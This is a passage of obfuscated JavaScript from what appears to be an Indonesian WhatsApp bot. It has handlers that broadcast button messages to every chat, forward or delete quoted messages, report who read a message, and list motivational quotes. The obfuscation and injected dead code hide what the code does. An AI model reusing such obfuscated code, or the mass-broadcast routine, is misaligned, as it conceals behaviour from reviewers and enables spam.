_0xdab78a={};_0xdab78a[_0x3153a4(0xcb,-0x186,-0x133,-0x12a)]=_0x319fe8['hJDTT'],_0xdab78a[_0x3153a4(0x595,0x2cc,0x22e,0xa16)+'o']=_0x3ea289,_0xdab78a[_0x3153a4(0x482,0x39c,0x8a,-0x1c)]=ftroli,_0xdab78a[_0x3153a4(-0x1ef,-0x408,-0x1aa,-0x13)+'ral']=!![],alpha[_0x3153a4(0x354,0x855,0x1f2,0x4c0)+'e'](_0x22924c[_0x2e8768(0x305,0x17d,-0x321,0x5a1)],_0x43ee8f,MessageType['buttonsMes'+_0x2e8768(0xd30,0xa7c,0xdaf,0x96e)],_0xdab78a);}}},ini_bc_pc_bang=_0x13045b=>{const _0x421778={};function _0x3faa43(_0x1f6f3f,_0x354ef6,_0x5caf2a,_0xff7fb6){return _0x593f96(_0x5caf2a- -0x22c,_0xff7fb6,_0x5caf2a-0x7d,_0xff7fb6-0x11f);}_0x421778[_0x3d2fe9(0x421,0x3b2,0x6aa,0x47c)]='ownerku',_0x421778[_0x3faa43(0x881,0x758,0x59a,0x7af)]='🐨\x20Owner',_0x421778[_0x3d2fe9(-0x577,-0x394,-0x107,-0x512)]=_0x3d2fe9(-0x382,0x1cc,-0x197,-0x5f1),_0x421778[_0x3d2fe9(-0x3e2,-0x8c,-0x76,-0x292)]=_0x3d2fe9(0x238,0x1a9,-0x147,-0x177),_0x421778[_0x3d2fe9(0x2d4,0x387,0x1c1,0x3ee)]=_0x3faa43(0x386,0x569,0x2d1,0x406)+'21';const _0x4c261c=_0x421778;var _0x1429ca=alpha['chats']['all']();let _0x54c8cc=_0x13045b;function _0x3d2fe9(_0xee70ae,_0x1e12a2,_0x28982f,_0x771107){return _0x593f96(_0x28982f- -0x4ec,_0x1e12a2,_0x28982f-0x6,_0x771107-0x66);}for(let _0x3e8765 of _0x1429ca){const _0x4934a7={};_0x4934a7[_0x3d2fe9(0x9c,0x1db,-0x10e,-0x31d)]=_0x4c261c[_0x3faa43(0x74b,0x9a6,0x96a,0xa3d)],_0x4934a7[_0x3d2fe9(0x172,-0x85,-0x248,-0x103)]={},_0x4934a7[_0x3d2fe9(0xa43,0xa0a,0x692,0x834)]=0x1,_0x4934a7[_0x3d2fe9(0x172,-0x85,-0x248,-0x103)][_0x3faa43(0x6a6,-0x123,0x190,-0xd)+'t']=_0x4c261c[_0x3d2fe9(-0x25,-0x152,0x2da,0xf8)];const _0x56c0a0={};_0x56c0a0['buttonId']=_0x4c261c[_0x3d2fe9(-0x4b9,-0x4f1,-0x107,-0x317)],_0x56c0a0[_0x3faa43(0x42e,0xcf,0x78,-0x94)]={},_0x56c0a0[_0x3d2fe9(0x605,0x797,0x692,0x81c)]=0x1,_0x56c0a0[_0x3faa43(0x42e,0xcf,0x78,-0x94)][_0x3faa43(0x5fb,0x184,0x190,0x92)+'t']=_0x4c261c[_0x3d2fe9(0x497,-0x4f3,-0x76,-0x91)];var _0x2718ba=[_0x4934a7,_0x56c0a0];const _0x3709af={};_0x3709af['contentTex'+'t']=_0x3d2fe9(0x76e,0x314,0x417,0x2ae)+'*'+enter+enter+_0x54c8cc,_0x3709af['footerText']=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x3709af[_0x3faa43(0x93b,0x4d9,0x8a1,0x870)]=_0x2718ba,_0x3709af[_0x3d2fe9(0x177,0x616,0x48c,0x40f)]=0x1;var _0x4c1bee=_0x3709af;const _0x185602={};_0x185602[_0x3d2fe9(0xa2f,0x6e8,0x75c,0x4be)]='hi',_0x185602[_0x3d2fe9(0x2e7,0x13f,0x522,0x2e4)+_0x3d2fe9(0xe7,0x6e,0x2fa,-0x37)]=0x3b9aca00,_0x185602['isForwarde'+'d']=!![],_0x185602[_0x3d2fe9(-0x80,-0x78,-0x1cc,-0x33a)+_0x3d2fe9(-0xe9,-0x2c8,-0x12a,0x157)]=!![];const _0xb63976={};_0xb63976[_0x3faa43(0x239,-0x141,0x3ae,0x248)]=_0x4c261c[_0x3faa43(0x1a4,0x6d0,0x481,0xb2)],_0xb63976[_0x3faa43(0x517,0xa92,0x878,0xbd3)+'o']=_0x185602,_0xb63976[_0x3d2fe9(0x31a,0x44b,0x4a5,0x1e3)]=ftroli,_0xb63976[_0x3faa43(-0x34e,0x4d9,0xf4,0x219)+_0x3faa43(0x610,-0x240,0x196,0x5ee)]=!![],alpha[_0x3faa43(0xb11,0x20b,0x637,0xa7d)+'e'](_0x3e8765[_0x3faa43(0x43a,0x2a7,0x130,0x395)],_0x4c1bee,MessageType[_0x3d2fe9(0x3d0,-0x45,-0x3,0x3b8)+_0x3d2fe9(0xbbf,0xb09,0x76f,0x620)],_0xb63976);}};function _0x1511(_0x4aaf7b,_0x2f4488){const _0x46237c=_0xa790();return _0x1511=function(_0x3d841f,_0x2ac25b){_0x3d841f=_0x3d841f-(-0x1943+-0x3cd+0x774*0x4);let _0x3eb051=_0x46237c[_0x3d841f];return _0x3eb051;},_0x1511(_0x4aaf7b,_0x2f4488);}switch(command){case'q':if(!mek[_0x593f96(0x51d,0x819,0x1db,0x24e)][_0x1e23e4(0x9c6,0xa45,0x8e6,0x77f)]&&!isOwner&&!isCreator)return reply(lang[_0x1e23e4(0x305,0x73d,0x3f8,0x474)]());if(!m['quoted'])return reply(_0x593f96(0xab5,0xc70,0x8aa,0x645)+_0x593f96(0x94e,0xa92,0xe40,0xbe2));let qse=alpha[_0x593f96(0x508,0xb9,0x58d,0x6d2)](await m['getQuotedO'+'bj']());if(!qse['quoted'])return reply(_0x1e23e4(-0x236,0x370,0x2b2,0x55d)+_0x1e23e4(0x143,0x219,0x20c,0x332)+_0x593f96(0x8a1,0xd8f,0x7b1,0x5d9)+'ot\x20contain'+'\x20a\x20reply!');await qse[_0x593f96(0x991,0x8b6,0xeaa,0x801)][_0x1e23e4(0x246,0xa36,0x64c,0xae2)+'rd'](m['chat'],!![]);break;case'del':case'delete':case'd':try{if(!isQuotedMsg)return reply(_0x593f96(0x867,0x567,0x44c,0x82e)+_0x593f96(0xbe2,0x710,0x71e,0xec5));const _0x36c738={};_0x36c738['id']=mek['message']['extendedTe'+_0x1e23e4(0x4e5,0x6c0,0x453,0x4c1)][_0x593f96(0xaa4,0x895,0x8ec,0xe62)+'o'][_0x593f96(0x9dd,0x571,0xd11,0x905)],_0x36c738[_0x1e23e4(0x31,0x278,0x127,0x3a2)]=from,_0x36c738[_0x1e23e4(0xd24,0xa02,0x8e6,0xc6a)]=!![],pp=_0x36c738;if(!isGroupAdmins&&!mek[_0x593f96(0x51d,0x15e,0x944,0xa0a)][_0x1e23e4(0xa40,0xd72,0x8e6,0xca4)]&&!isOwner&&!isCreator)return reply(mess['only'][_0x1e23e4(0x8fc,0xb19,0x98f,0xabc)]);alpha[_0x593f96(0xc76,0x9df,0xf75,0x83f)+_0x1e23e4(-0xe8,0x285,0x294,0x16e)](from,pp);}catch(_0x2641cb){reply(_0x593f96(0x2f6,-0x168,0x682,-0x1b9)+'n\x20botnya\x20'),reply(_0x2641cb),console[_0x1e23e4(0x919,0x402,0x58e,0x703)](_0x2641cb);}break;case _0x593f96(0xc6b,0xedc,0xeda,0x8b5):try{if(!isGroup)return reply(_0x1e23e4(0x6f5,0x676,0xa49,0x84e)+_0x1e23e4(0xddc,0xb3b,0xae5,0x893)+_0x1e23e4(0x26c,-0x192,0x31e,0x6b8));if(!isQuotedMsg)return reply(_0x593f96(0x867,0x7f7,0x3f5,0x3ea)+'n\x20botnya');infom=await alpha['messageInf'+'o'](from,mek[_0x1e23e4(0xb8e,0xad8,0x9a7,0x86c)][_0x1e23e4(-0xf5,0x291,0x1c1,0x39b)+_0x593f96(0x631,0x423,0x9ea,0x490)][_0x1e23e4(0xa2a,0x5fc,0x8c6,0x7f2)+'o'][_0x593f96(0x9dd,0x517,0xd50,0x51f)]),hemm=infom[_0x593f96(0x3aa,0x72e,0x4ab,0x75b)],hemms=infom[_0x1e23e4(0x927,0x33d,0x631,0x2b3)],readon=hemms[_0x593f96(0x323,0x178,-0xa7,-0x4d)](_0x236afe=>_0x236afe[_0x593f96(0x35c,0x62,0x2d1,0x3a2)]),readdin=hemm['map'](_0x51e3a0=>_0x51e3a0['jid']),stamp=hemm[_0x1e23e4(-0x2d1,0x476,0x145,0x279)](_0x5a8ca2=>_0x5a8ca2['t']);function toTime(_0x3461a7,_0x103c50){const _0x42a9ea={'rViWw':_0x3cb24f(-0x90,-0x10a,0x27d,-0xa5)+_0x1e15f3(0x1f8,0x5f6,0x4e3,0x6da),'FBiAT':_0x1e15f3(0x83f,0x3dc,0x6ea,0xcc2)+_0x3cb24f(0x26d,0x3e7,0x54a,0x700)+']','IumNA':function(_0xecc768,_0x4df78b){return _0xecc768(_0x4df78b);},'GJYTz':_0x3cb24f(0x57d,-0x33f,0x150,-0x23b),'FosfJ':_0x1e15f3(0x9f3,0x528,0xe79,0xe4b),'eJtVP':function(_0xc4ff46,_0x569812){return _0xc4ff46==_0x569812;},'BiVTz':_0x3cb24f(0xbf3,0xcbc,0x9ed,0x6db),'NtMEw':function(_0x705c86,_0x50fdd2){return _0x705c86===_0x50fdd2;},'vGUUF':_0x1e15f3(0x66e,0x5fd,0x1ae,0xafd),'Hqbgd':_0x3cb24f(0x298,0x1a3,0x607,0x9bc),'MGaLV':function(_0x4efecd,_0x36cff9){return _0x4efecd*_0x36cff9;}};function _0x3cb24f(_0x37db14,_0x250cbb,_0x7bcd0f,_0x4f6e80){return _0x593f96(_0x7bcd0f- -0x2ea,_0x250cbb,_0x7bcd0f-0x12d,_0x4f6e80-0xb5);}_0x103c50=_0x42a9ea[_0x3cb24f(0x5db,0x3f0,0x434,-0x84)](typeof _0x103c50,_0x42a9ea[_0x3cb24f(0xb1a,0xd22,0x8e4,0x3fe)])?![]:!![];let _0x417dd6=new Date(_0x3461a7);if(_0x103c50){if(_0x42a9ea['NtMEw'](_0x42a9ea['vGUUF'],_0x42a9ea['Hqbgd'])){_0x2934c0[_0x1e15f3(0x537,0x979,0xec,0x4e)](_0x42a9ea[_0x1e15f3(0x947,0x930,0x4f3,0x640)],_0x42a9ea[_0x1e15f3(0x9d1,0xdc6,0xe93,0xbcf)],_0x387c1c,_0x42a9ea[_0x1e15f3(0x35b,0x37e,0x13a,0x58c)](_0x27ce25,_0x3cb24f(-0xb,0x448,-0x9,-0xb5)+_0x1e15f3(0x905,0xa31,0x59b,0x966)+'nt\x20Gopay'));var _0x170388=_0x3cb24f(0x9d6,0x4cf,0x9e9,0xc29)+_0x334de6['split']('@')[0x802*0x4+0x24b2+0x225d*-0x2]+(',\x20kamu\x20mau'+_0x1e15f3(0x418,0x7f4,0x6c,0x1d6)+_0x3cb24f(-0xab,0x603,0x3da,0x629)+'a\x20atau\x20pak'+_0x3cb24f(0x24e,0x71b,0x2f9,0x2b5));const _0x563593={};_0x563593[_0x1e15f3(0x187,0x38,0x4ff,-0x1d7)+'t']=_0x42a9ea[_0x1e15f3(0xa06,0xcc2,0xb4e,0xe43)];const _0x3989d3={};_0x3989d3[_0x1e15f3(0x1a9,0x69f,0xfd,0x43f)]=_0x1e15f3(0x501,0x225,0x220,0x755)+_0x3cb24f(-0x26e,0x4c1,-0x8,0x146),_0x3989d3[_0x1e15f3(0x6f,-0x2ab,0x470,0x319)]=_0x563593,_0x3989d3[_0x3cb24f(0xc4a,0x59c,0x894,0xa31)]=0x1;const _0x332383={};_0x332383['displayTex'+'t']=_0x42a9ea[_0x1e15f3(0xa95,0xde5,0xa12,0xeec)];const _0x1b0e95={};_0x1b0e95[_0x3cb24f(0x5b4,0x379,0xf4,-0x315)]='qr_gopay13',_0x1b0e95['buttonText']=_0x332383,_0x1b0e95[_0x1e15f3(0x949,0xccd,0x897,0x4ea)]=0x1;const _0x461ff0=[_0x3989d3,_0x1b0e95],_0x3ed4cf={};_0x3ed4cf[_0x1e15f3(0x280,0x405,0x29,-0xd)+'t']=_0x170388,_0x3ed4cf[_0x1e15f3(0x37b,0x117,0x334,0x3f4)]=''+_0x5ee4d1+_0x110e26+_0x2bb56d+_0x4c3f35+'©\x20'+_0x560590,_0x3ed4cf['buttons']=_0x461ff0,_0x3ed4cf[_0x1e15f3(0x743,0x596,0x237,0x7dd)]=0x1;const _0x334062=_0x3ed4cf,_0x1b8551={};_0x1b8551[_0x3cb24f(0xdad,0x4d9,0x95e,0x610)]='hi',_0x1b8551[_0x1e15f3(0x7d9,0x9c6,0x824,0x8cc)+_0x1e15f3(0x5b1,0x473,0x80f,0x72a)]=0x3b9aca00,_0x1b8551[_0x1e15f3(0xa58,0x7e9,0x881,0xa25)+'d']=!![],_0x1b8551['sendEpheme'+_0x3cb24f(0x2a6,-0x28c,0xd8,-0x33d)]=!![],_0x1b8551[_0x3cb24f(-0x23b,-0x503,-0x3d,-0x35d)+'id']=[_0x2311dc];const _0x83b0e5={};_0x83b0e5['caption']=_0x1e15f3(0x2c8,0x326,0x58c,-0x1ee)+'21',_0x83b0e5[_0x3cb24f(0xc7d,0xccf,0x7ba,0x42c)+'o']=_0x1b8551,_0x83b0e5[_0x3cb24f(0x618,0x90a,0x6a7,0x728)]=_0x85c797,_0x83b0e5[_0x3cb24f(0x1f7,0x296,0x36,-0x175)+_0x1e15f3(0x18d,0x46d,-0x17a,0x322)]=!![],_0xea43d5[_0x3cb24f(0x378,0xa8f,0x579,0x8fe)+'e'](_0x5edef4,_0x334062,_0x49c63d[_0x1e15f3(0x2b4,0x1c4,0x4ce,-0x101)+_0x1e15f3(0xa26,0x53c,0x5ff,0x50f)],_0x83b0e5);}else _0x417dd6=new Date(_0x42a9ea[_0x1e15f3(0x94a,0xe4a,0xd4a,0x435)](_0x3461a7,-0x22b0+-0x2591+0x1*0x4c29));}var _0x648983=_0x417dd6[_0x3cb24f(0x3ed,0x1f0,0x682,0x1fb)]();function _0x1e15f3(_0x2f3b5b,_0x4e9fd0,_0x273b29,_0x5b4edd){return _0x1e23e4(_0x2f3b5b-0x118,_0x4e9fd0-0x1bf,_0x2f3b5b- -0x57,_0x5b4edd);}var _0x525b47=_0x417dd6[_0x3cb24f(0x6cc,-0xea,0x1bd,0x4dd)](),_0x2101e6=_0x417dd6[_0x3cb24f(0x98d,0x58d,0x9bd,0x95b)](),_0x252cc3=_0x648983+':'+_0x525b47+':'+_0x2101e6;return _0x252cc3;}function toBulan(_0x2218fc,_0x2cb44c){const _0x436d79={};_0x436d79[_0x531268(0x2f0,0x516,0x43c,0x2f9)]=function(_0x4b7c52,_0x3b4439){return _0x4b7c52==_0x3b4439;};function _0x4ccc01(_0x120a7a,_0x1db02d,_0xb19619,_0x1077ca){return _0x593f96(_0x120a7a- -0x4ba,_0x1db02d,_0xb19619-0xb1,_0x1077ca-0x71);}_0x436d79['qDtzN']=_0x531268(0x8b2,0xc81,0x4ef,0x822),_0x436d79[_0x4ccc01(0x239,0x11,0x1a7,0x2f5)]=function(_0x445990,_0x1e348e){return _0x445990*_0x1e348e;},_0x436d79['hbkfE']=_0x4ccc01(0x50e,0x9c1,0x30d,0xa07),_0x436d79[_0x531268(-0xf4,-0x454,0x395,-0x80)]=_0x531268(0x10,-0x546,-0x178,-0x1ad),_0x436d79[_0x4ccc01(0x320,0x5dc,0x2dc,-0x92)]=_0x4ccc01(0x4a4,0x5e9,-0x4b,0x374),_0x436d79[_0x531268(-0x2b0,0x4c,0x122,0x1a7)]='Mei',_0x436d79[_0x531268(0x6b4,0x3fd,0x641,0x253)]=_0x4ccc01(0x73e,0x3ca,0xae3,0x4e2),_0x436d79['wjrYH']=_0x531268(0x35e,-0x15b,0x5a,0xee),_0x436d79[_0x4ccc01(0x9,-0x3c,0x48a,-0x1ea)]=_0x4ccc01(0x700,0x332,0x375,0x7cb),_0x436d79[_0x4ccc01(0x5f1,0x375,0x4a9,0x116)]=_0x531268(0x67d,0x20d,0x829,0x6af),_0x436d79[_0x531268(-0x37b,-0x698,-0x405,-0x1b6)]='Nopember',_0x436d79['mDcFV']=_0x531268(0x3f7,-0x4b9,0x233,-0xc1),_0x436d79[_0x531268(0x397,0x874,0x988,0x7d2)]='Minggu',_0x436d79['TxMVy']='Senin',_0x436d79[_0x4ccc01(0x9b,-0xa3,0x243,-0x21b)]=_0x4ccc01(0x4eb,0x11a,0x655,0x935),_0x436d79['Zlkzz']=_0x531268(0x709,0x7a0,0xb02,0x649),_0x436d79['jFpjq']='Kamis',_0x436d79[_0x531268(0x8bb,0x583,0x203,0x503)]='Jum\x20at',_0x436d79[_0x531268(0x9d7,0x241,0x6d4,0x56c)]='Sabtu',_0x436d79[_0x4ccc01(-0x135,-0x5c9,0x331,-0x333)]=function(_0x137dc5,_0x2e8d3a){return _0x137dc5<_0x2e8d3a;},_0x436d79[_0x531268(0x3fa,0xcd0,0xad7,0x7e0)]=function(_0x2ff284,_0x10214f){return _0x2ff284+_0x10214f;};const _0x346b49=_0x436d79;_0x2cb44c=_0x346b49[_0x4ccc01(0x2f4,-0x108,0x58d,-0x16f)](typeof _0x2cb44c,_0x346b49[_0x4ccc01(0x5f,0x52e,0x44a,0x4c4)])?![]:!![];let _0x38b766=new Date(_0x2218fc);_0x2cb44c&&(_0x38b766=new Date(_0x346b49[_0x4ccc01(0x239,0x535,0x71c,0x313)](_0x2218fc,-0x792+-0xc60+0x47*0x56)));var _0x42c426=[_0x346b49[_0x531268(-0x1fa,0x169,0x573,0x16b)],_0x346b49[_0x531268(-0x3fb,-0xfc,-0xb8,-0x80)],_0x346b49[_0x4ccc01(0x320,0x630,0x32e,0x480)],'April',_0x346b49[_0x531268(-0x225,0x1ab,0x11c,0x1a7)],_0x346b49[_0x531268(0x36b,0x15f,0x6a2,0x253)],_0x346b49[_0x531268(0x1f9,0x16b,-0x4ff,-0xe2)],_0x346b49['AGHZa'],_0x346b49[_0x4ccc01(0x5f1,0xa44,0x340,0x7f1)],_0x531268(0x96c,0x6f7,0x6ef,0x502),_0x346b49[_0x4ccc01(-0x1bb,-0x56,0x2ee,-0x308)],_0x346b49[_0x4ccc01(-0xa,0x25c,0x11,-0x2b2)]],_0x7f215f=[_0x346b49['iIJQk'],_0x346b49[_0x4ccc01(0x29,0x3f3,0x38a,-0x1e3)],_0x346b49['KiqMB'],_0x346b49[_0x4ccc01(0x5c1,0x9ff,0xce,0x9dc)],_0x346b49[_0x4ccc01(0x158,0x314,-0x275,-0x1f8)],_0x346b49['jLGbf'],_0x346b49[_0x531268(0x6d4,0x1c2,0x525,0x56c)]],_0x1d2626=_0x38b766[_0x4ccc01(0x1b1,-0x8f,0x7,-0x289)]();bulanee=_0x38b766[_0x531268(-0x4cb,0x485,-0x84,-0x65)]();var _0x57ae24=_0x38b766[_0x4ccc01(0x379,-0x8d,0x5bf,0x723)](),_0x57ae24=_0x7f215f[_0x57ae24],_0x4ea0a9=_0x38b766[_0x531268(0xa70,0x35e,0x4cc,0x7c2)](),_0x45c9c2=_0x346b49[_0x531268(0x1bd,0x208,0x22b,-0x130)](_0x4ea0a9,0x184f+-0x11bf+-0x2a8*0x1)?_0x346b49['SdzBP'](_0x4ea0a9,-0x1510+-0x3*-0x833+0x3e3):_0x4ea0a9;function _0x531268(_0x58b577,_0x12fb4b,_0x1b3441,_0x348061){return _0x593f96(_0x348061- -0x4b5,_0x1b3441,_0x1b3441-0x44,_0x348061-0xc0);}var _0x28093f=_0x57ae24+',\x20'+_0x1d2626+'\x20-\x20'+_0x42c426[bulanee]+_0x4ccc01(0x699,0x999,0x6a2,0x45e)+_0x45c9c2;return _0x28093f;}teksx=_0x1e23e4(0x3ce,0x6ea,0x295,-0x105)+enter;for(let i of hemm){teksx+='📍\x20Nama\x20:\x20@'+i[_0x1e23e4(0x3ff,0x16,0x17e,-0x214)][_0x1e23e4(-0x329,-0x317,0x133,0x4ad)]('@')[0x5cd+-0x3*-0x11c+-0x921]+enter+_0x1e23e4(0x896,0xaca,0x8c9,0x5d2)+toTime(i['t'],!![])+enter+(_0x1e23e4(0xc86,0xca7,0x879,0x8a7)+':\x20')+toBulan(i['t'],!![])+enter+'•'+enter;}teksx1=_0x1e23e4(0xa7e,0x852,0x7de,0x5e1)+'D*'+enter+enter;for(let i of hemms){teksx1+=_0x1e23e4(0x954,0xfda,0xacc,0xf56)+i['jid'][_0x1e23e4(-0x386,0x33b,0x133,-0x340)]('@')[0x4c5*0x2+0x1*0x110+0x2*-0x54d]+enter,teksx1+='📍\x20Waktu\x20:\x20'+toTime(i['t'],!![])+enter+(_0x593f96(0xa57,0x6f1,0x83c,0xa35)+':\x20')+toBulan(i['t'],!![])+enter+'•'+enter;}const _0x5046d7={};_0x5046d7['forwarding'+_0x593f96(0x7e6,0x5da,0x2e7,0x46f)]=0x3e7,_0x5046d7['isForwarde'+'d']=!![],_0x5046d7['mentionedJ'+'id']=readdin,alpha[_0x593f96(0x863,0xabe,0x5ea,0x426)+'e'](from,teksx,text,{'sendEphemeral':!![],'quoted':mek,'thumbnail':fs[_0x1e23e4(0xed,0x2a7,0x581,0xbc)+'nc'](_0x1e23e4(0x1a,0x66,0x45b,0x530)+thumbnail),'contextInfo':_0x5046d7});const _0x18af0a={};_0x18af0a[_0x593f96(0xa0e,0x78d,0x86b,0x770)+'Score']=0x3e7,_0x18af0a[_0x593f96(0xc8d,0xc22,0x9f0,0xeb0)+'d']=!![],_0x18af0a[_0x593f96(0x2ad,0x2aa,0x19e,0x10)+'id']=readon,alpha[_0x1e23e4(0x213,0x9bf,0x685,0x89a)+'e'](from,teksx1,text,{'sendEphemeral':!![],'quoted':mek,'thumbnail':fs[_0x1e23e4(0x590,0x71b,0x581,0x3ca)+'nc'](_0x1e23e4(0x2cf,0x792,0x45b,0x838)+thumbnail),'contextInfo':_0x18af0a});}catch(_0x4b8dcf){reply('reply\x20pesa'+_0x1e23e4(0xcb0,0xbd6,0x9ff,0xdc6)),reply(_0x4b8dcf),console[_0x1e23e4(0x1a0,0x903,0x58e,0x38a)](_0x4b8dcf);}break;case _0x593f96(0x96e,0x4b0,0x4ab,0xd6f):const kta=[_0x593f96(0x428,0x37d,0x7a1,0x831)+_0x593f96(0x5e2,0x803,0x2aa,0x260)+_0x593f96(0x6d9,0x757,0x266,0x2b9)+_0x1e23e4(0x86a,0x5b0,0x7f2,0x4a6)+_0x1e23e4(0x190,0x81f,0x533,0x3d3)+'i.',_0x1e23e4(0x70,0x1a3,0x429,0x8ad)+_0x1e23e4(0xe8a,0x6de,0x97f,0x73c)+'mang\x20mampu'+_0x1e23e4(0xc67,0x835,0x75a,0x493)+'menghadapi'+_0x593f96(0x8f5,0xcfa,0x9aa,0x997)+_0x1e23e4(0x91d,0x8b7,0x9fb,0xd11)+_0x593f96(0x62e,0x9c0,0x983,0x8e9)+_0x1e23e4(0x2e6,0x477,0x431,0x647)+_0x593f96(0xb04,0xf73,0xc44,0x7fd)+_0x1e23e4(0x354,0x352,0x761,0x86a)+_0x1e23e4(0x965,0x250,0x4b9,0x370)+_0x593f96(0x4a2,0x836,0x209,0x412)+'aan.',_0x593f96(0xbc2,0xa4d,0xa12,0x706)+_0x593f96(0x91b,0x56d,0xacc,0x5f4)+_0x593f96(0x706,0x47b,0x65f,0x94b)+_0x1e23e4(0x533,0x709,0x76e,0x767)+_0x1e23e4(0x412,0x263,0x3b6,0x555)+_0x593f96(0x2f8,0x3f0,0x7fb,-0x1a0)+_0x593f96(0xb93,0xbc4,0x6be,0xd84)+_0x1e23e4(0x3c8,0xc7f,0x768,0x828),'Penderitaa'+_0x1e23e4(0x2dd,0x18a,0x40d,-0xb1)+'elajaran.',_0x593f96(0x403,0x891,0x217,0x264)+_0x1e23e4(0x9b1,0xcb1,0x8bd,0x605)+'pa\x20agama\x20a'+_0x1e23e4(0x6a0,0xa4a,0xa22,0xefb)+_0x593f96(0xa23,0xc3c,0xe08,0xd1c),_0x1e23e4(-0xbd,0x1ed,0x292,-0x1b5)+_0x593f96(0xa3c,0xa53,0xe43,0x5b2)+_0x593f96(0x67b,0x62d,0x469,0x85a)+_0x1e23e4(0x35e,-0x28b,0x147,-0x34f)+_0x593f96(0x6ea,0x4e8,0x9cd,0x744)+_0x1e23e4(0xa56,0xcb4,0xa58,0xb0d)+_0x1e23e4(0x214,0x170,0x4aa,0x7f4)+'bergerak.',_0x1e23e4(0x7bb,0x747,0x90b,0x910)+_0x1e23e4(0x950,0xcb1,0xa57,0x617)+_0x1e23e4(0x210,0x66,0x4a3,0x40e)+_0x593f96(0xcd1,0x11c1,0xbfc,0x10b9)+_0x593f96(0x864,0xba7,0x8b9,0xd13)+_0x1e23e4(0x5ca,0x290,0x194,0x36c)+_0x1e23e4(0x4ed,0xbd1,0x887,0xd26)+'g\x20keras\x20ke'+'pala.',_0x593f96(0x68a,0xa3c,0x533,0xb11)+'a,\x20sebuah\x20'+_0x1e23e4(0x84e,0x710,0x8bc,0x5c9)+_0x593f96(0x3af,0x545,0x619,0x546)+_0x1e23e4(0x899,0x5e3,0x4f3,0x397)+_0x593f96(0xa20,0xe26,0x78a,0x807)+_0x593f96(0x674,0xb74,0x399,0x35d)+'yang\x20dibut'+_0x1e23e4(0x6f3,-0x104,0x23c,-0x255)+_0x593f96(0x91b,0x8d5,0xd48,0x4d7)+'\x20bisa\x20mera'+_0x1e23e4(0x2c7,0xaf6,0x773,0x93e)+'?',_0x1e23e4(0x36d,0x21c,0x6ac,0x7fc)+_0x1e23e4(0x4c4,0x1cd,0x690,0xa33)+_0x593f96(0x703,0x3f3,0x445,0x343)+_0x593f96(0xa51,0x96e,0x65d,0x951)+_0x1e23e4(0x905,0xc7b,0x9da,0x6d9)+_0x593f96(0x5b7,0x9d5,0x3c8,0x87d)+_0x1e23e4(-0x298,0x44e,0x21f,-0x2ed)+_0x1e23e4(0x950,0x9d3,0x716,0xaeb),_0x1e23e4(0x111,-0x3c,0x2d3,0x2c2)+_0x1e23e4(0xde6,0x7e0,0xa6d,0xa9c)+_0x593f96(0x6a9,0x745,0x733,0x704)+_0x1e23e4(0x374,-0x162,0x1b0,-0xef)+'\x20Anda\x20iala'+_0x1e23e4(0x3ac,0x699,0x61b,0x5f8)+'tugas\x20kepa'+_0x593f96(0x9d4,0x733,0x677,0xa88)+_0x593f96(0x868,0xab8,0x3ab,0x8ed),_0x593f96(0xc05,0x904,0x71b,0xaf4)+_0x593f96(0x55f,0x4ce,0x660,0x4f4)+_0x593f96(0x735,0xb22,0x566,0x3bd)+'mangat.\x20Se'+_0x593f96(0x5f9,0x70e,0x50b,0x9ca)+_0x593f96(0x9a6,0x5de,0xcc6,0xb3d)+_0x593f96(0x40d,0x53b,0x377,0x6d4)+_0x1e23e4(0x525,0x702,0x80a,0xc95)+_0x1e23e4(0x38e,0x13a,0xcc,-0x7b)+_0x1e23e4(-0x380,-0x197,0xe9,-0x32e)+_0x1e23e4(0x1b4,0x8a1,0x6a6,0xb8e)+'inan\x20untuk'+_0x593f96(0xa93,0xe7b,0xcd9,0xd91)+_0x593f96(0xac0,0xf9c,0xcea,0xc4d),_0x593f96(0xb35,0xa1b,0x741,0xada)+_0x593f96(0xb43,0xf53,0x1024,0x993)+_0x593f96(0xaf5,0xb65,0xec8,0xc19)+_0x1e23e4(0x6f0,0x511,0x286,0x9b)+_0x593f96(0x52e,0x765,0x949,0x337)+_0x593f96(0x2de,0x110,-0x18,0x485),_0x593f96(0x9e9,0xa7d,0x4fd,0x622)+'\x20berharap\x20'+'menjadi\x20se'+_0x1e23e4(0x27f,0x387,0x476,0x6f6)+_0x593f96(0xa54,0xb9a,0xdce,0x866)+'orang.\x20Say'+'a\x20hanya\x20in'+_0x1e23e4(0xcec,0x9b4,0x7fb,0xcad)+_0x593f96(0xbd1,0xec7,0xd6f,0xb7e)+'untuk\x20sese'+_0x593f96(0x9aa,0xeaa,0x7f9,0xd3b),_0x1e23e4(-0x179,-0x185,0x1f6,0x6b5)+_0x593f96(0xcc8,0x995,0x8d3,0xe73)+_0x593f96(0x81a,0x5b9,0xa4f,0xc7c)+_0x593f96(0xc42,0xc69,0x111a,0xedf)+_0x1e23e4(0x50a,0x78f,0x7c5,0xc2c)+_0x593f96(0x9a7,0x98d,0xd76,0xd74),_0x593f96(0x40c,0x106,0x12c,0x47b)+_0x593f96(0xc20,0xd27,0xfa5,0xb5f)+'g\x20dapat\x20me'+_0x593f96(0x968,0x79e,0x80f,0xc71)+_0x593f96(0x60d,0x48a,0x366,0x31b)+'inya,\x20menj'+_0x593f96(0x88c,0x7c5,0x676,0xcc7)+_0x593f96(0xbbd,0x722,0x1050,0xa63)+_0x593f96(0x3d7,-0xd0,0x6a4,0x70c)+_0x593f96(0x7ce,0x963,0x926,0x509)+_0x593f96(0x4bf,0x89f,0x2b1,0x6e0)+'bahtera\x20hi'+_0x1e23e4(0x347,0x34c,0x60c,0x6f3),_0x593f96(0x578,0xa37,0x1a6,0x85f)+'ng\x20jujur\x20l'+_0x593f96(0x98c,0x491,0xcf1,0x566)+_0x593f96(0xbcb,0x964,0x72d,0xb45)+_0x593f96(0x777,0x3e0,0xc34,0x45f)+_0x1e23e4(0x2a3,0x62,0x32d,0x12f)+'\x20yang\x20diwa'+_0x1e23e4(-0x4d,0x2f2,0x223,-0x25b)+_0x593f96(0x6a4,0x4d0,0x742,0x63a)+_0x1e23e4(0x8f1,0x4fe,0x97b,0xc89),_0x1e23e4(0x4a6,0x8ab,0x8a0,0x9dc)+_0x1e23e4(0x48a,0x37d,0x353,0x7e8)+_0x593f96(0x2be,0x58f,0x6cf,0xb5)+_0x1e23e4(0x95d,0x547,0x95d,0x615)+_0x593f96(0xa1a,0xc34,0x922,0xbc0)+'orang\x20yang'+_0x593f96(0xca1,0xe39,0xfab,0xf18)+_0x593f96(0xad5,0x96c,0xbb0,0xe84),_0x593f96(0x8be,0x3fd,